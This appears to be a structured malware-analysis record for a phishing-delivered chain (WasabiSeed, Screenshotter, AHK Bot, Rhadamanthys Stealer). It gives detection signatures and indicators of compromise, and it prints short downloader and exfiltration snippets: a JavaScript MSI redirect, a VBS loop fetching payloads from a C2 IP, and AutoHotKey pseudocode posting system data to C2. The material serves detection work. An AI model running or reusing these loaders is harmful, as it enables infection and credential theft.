package_info.package_name: WasabiSeed, Screenshotter, AHK Bot, Rhadamanthys Stealer
package_info.package_manager: Custom-delivered via phishing/MSI installers (not public package manager)
package_info.package_versions: N/A (custom malware, delivered as MSI/VBS/AutoHotKey scripts)
package_info.why_malicious: These packages are part of a coordinated, multi-stage attack chain designed to gain initial access to victim systems, perform automated reconnaissance, and exfiltrate sensitive data. The components include downloaders, screenshot utilities, automation bots, and infostealers, each performing unauthorized actions such as downloading further payloads, capturing and exfiltrating screenshots, automating system profiling, and stealing credentials and files from a wide range of applications.

execution_context.trigger: runtime (user opens malicious attachment or clicks phishing link)
execution_context.file_location: JavaScript file (Document_24_jan-3559116.js) delivered via phishing email

malicious_snippets.code_snippet: window.location.href = 'hxxp://79.137.198.60/1/ke.msi'; // or similar code to download and execute MSI
malicious_snippets.code_behavior: At runtime, the code redirects the user's browser to a remote URL, initiates the download of a malicious MSI installer, and enables the delivery of the WasabiSeed payload.

malice_analysis.why_suspicious: Redirecting users to download and execute MSI installers from an untrusted remote IP is a common initial infection vector for malware campaigns.
malice_analysis.violated_expectations: Normal JavaScript in documents or web pages should not trigger downloads of executable installers from untrusted or hardcoded sources without explicit user consent.
malice_analysis.similar_legitimate_use: Software updaters may download installers, but only from trusted, signed sources and with clear user interaction.
key_indicators: Remote download of MSI from suspicious, hardcoded IP address
No user consent or validation before download
Initiates malware infection chain by delivering executable payload

malicious_snippets.code_snippet:
Set objInstaller = CreateObject("WindowsInstaller.Installer")
Do
  objInstaller.InstallProduct "hxxp://109.107.173.72/%serial%", ""
  WScript.Sleep 60000
Loop
malicious_snippets.code_behavior: At runtime, the VBS script repeatedly uses the Windows Installer COM object to connect to a remote C2 server, attempts to download and execute additional MSI payloads in an infinite loop, and enables further malware delivery.

malice_analysis.why_suspicious: Continuous polling of a remote C2 server for new payloads using an infinite loop is a hallmark of downloader malware, increasing persistence and likelihood of successful secondary payload delivery.
malice_analysis.violated_expectations: Legitimate installers do not repeatedly contact remote servers for arbitrary payloads, nor do they operate in persistent, uncontrolled loops.
malice_analysis.similar_legitimate_use: Enterprise software updaters may check for updates, but not with hardcoded C2 addresses or in a persistent, non-user-controlled manner.
key_indicators: Repeated remote MSI downloads from hardcoded C2 address
Persistence via infinite loop in script
Use of Windows Installer COM object for unauthorized payload delivery

malicious_snippets.code_behavior: At runtime, the code captures a JPG screenshot of the user's desktop, transmits the image via HTTP POST to a remote C2 server, and enables automated reconnaissance and data exfiltration.

malice_analysis.why_suspicious: Automated screenshot capture and exfiltration to a remote server is a classic reconnaissance technique used by attackers to assess victim environments.
malice_analysis.violated_expectations: Legitimate software should not capture and transmit desktop images without explicit user consent and notification.
malice_analysis.similar_legitimate_use: Remote support tools may capture screenshots, but only with explicit user approval and to trusted endpoints.
key_indicators: Automated desktop screenshot capture without user notification
Hardcoded C2 exfiltration endpoint in code
HTTP POST requests containing image data to suspicious remote server

execution_context.trigger: runtime (after reconnaissance, if target is interesting)

malicious_snippets.code_snippet:
; Pseudocode (AutoHotKey)
C2 := "hxxp://89.208.105.255/" . serial
Loop {
  data := CollectSystemInfo()
  HttpPost(C2, data)
  Sleep, 60000
}
malicious_snippets.code_behavior: At runtime, the script collects system information, sends the data to a hardcoded C2 server using the C: drive serial as a unique identifier in the URL, and repeatedly exfiltrates profiling data to enable further targeted actions.

malice_analysis.why_suspicious: Automated system profiling and repeated exfiltration of environment data to a C2 server is a common step in targeted attacks, enabling attackers to assess and prioritize victims.
malice_analysis.violated_expectations: Legitimate automation scripts do not exfiltrate system data to unknown or untrusted servers, nor do they use unique hardware identifiers for tracking.
malice_analysis.similar_legitimate_use: Enterprise inventory tools may collect system info, but only transmit it to trusted, internal servers and with user or admin awareness.
key_indicators: Use of drive serial as unique victim identifier in C2 communication
Hardcoded C2 server address in script
Automated, repeated exfiltration of system profiling data

execution_context.trigger: runtime (after AHK Bot, if target is valuable)
execution_context.file_location: Rhadamanthys Stealer (delivered via AHK Bot or separate payload)

malicious_snippets.code_behavior: At runtime, the stealer iterates through a list of applications including browsers, crypto wallets, chat clients, FTP clients, and VPNs, extracts credentials and files, and exfiltrates this sensitive data to a remote C2 server.

malice_analysis.why_suspicious: Bulk extraction and exfiltration of credentials and files from multiple sensitive applications is a primary goal of infostealer malware, leading to severe data compromise.
malice_analysis.violated_expectations: Legitimate software should not access or transmit sensitive user data from unrelated applications, nor should it exfiltrate such data to external servers.
malice_analysis.similar_legitimate_use: Password managers may access credentials, but only with user consent and never transmit them to untrusted or external domains.
key_indicators: Automated credential and file extraction from multiple application types
Targeting of browsers, wallets, chat, FTP, and VPN clients
Exfiltration of sensitive data to hardcoded C2 domain

attack_chain.action: User receives phishing email with malicious attachment or link.
attack_chain.leads_to: Initial infection via download and execution of WasabiSeed MSI.

attack_chain.action: WasabiSeed VBS downloader repeatedly contacts C2 to fetch additional payloads.
attack_chain.leads_to: Download and execution of Screenshotter and AHK Bot.

attack_chain.action: Screenshotter captures and exfiltrates desktop screenshots to C2 for reconnaissance.
attack_chain.leads_to: Attacker reviews screenshots to determine if target is valuable.

attack_chain.action: If target is interesting, AHK Bot is deployed to automate further profiling and C2 communication.
attack_chain.leads_to: System profiling and preparation for further exploitation.

attack_chain.action: If target is high-value, Rhadamanthys Stealer is deployed to extract and exfiltrate credentials, files, and sensitive data.

behavioral_signatures: Repeated download attempts of MSI installers from untrusted IPs or domains using scripting languages (JavaScript, VBS, AutoHotKey)
VBS or AutoHotKey scripts that loop and contact remote C2 servers for payloads or data exfiltration
Automated screenshot capture and exfiltration via HTTP POST to hardcoded endpoints
Credential and file access from unrelated applications immediately followed by network exfiltration to suspicious domains
file_indicators: AutoHotKey scripts (au3.ahk) and executables (au3.exe) in temporary or user directories
Suspicious MSI installers (ke.msi, Screenshotter Installer MSI, AHK Bot installer MSI) present in download or temp locations
Presence of screenshot files or temporary images in user directories created by unknown processes
network_indicators: HTTP POST requests to /screenshot/%serial% or similar C2 paths on 109.107.173.72
Frequent outbound connections to hardcoded IPs/domains not associated with legitimate software or business operations
detection_knowledge.how_to_detect: Monitor for execution of MSI installers from untrusted sources, especially those that drop or execute VBS or AutoHotKey scripts. Detect repeated outbound connections to known C2 IPs/domains and HTTP POST requests containing screenshots or credential data. Flag processes that access browser, wallet, chat, FTP, or VPN client data and immediately initiate network exfiltration. Look for the presence of suspicious scripts or binaries in user or temp directories, and correlate these events with phishing email delivery or suspicious user activity.
